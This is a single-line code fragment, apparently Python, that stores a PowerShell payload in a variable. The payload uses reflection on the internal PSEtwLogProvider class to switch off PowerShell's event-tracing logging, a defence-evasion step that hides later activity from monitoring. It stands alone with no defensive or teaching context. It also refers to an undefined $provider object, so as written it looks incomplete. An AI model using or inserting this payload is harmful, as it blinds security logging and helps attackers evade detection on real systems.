payload = "$type=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')\n$field=$type.GetField('m_enabled','NonPublic,Instance')\n$field.SetValue($provider,0)\n"
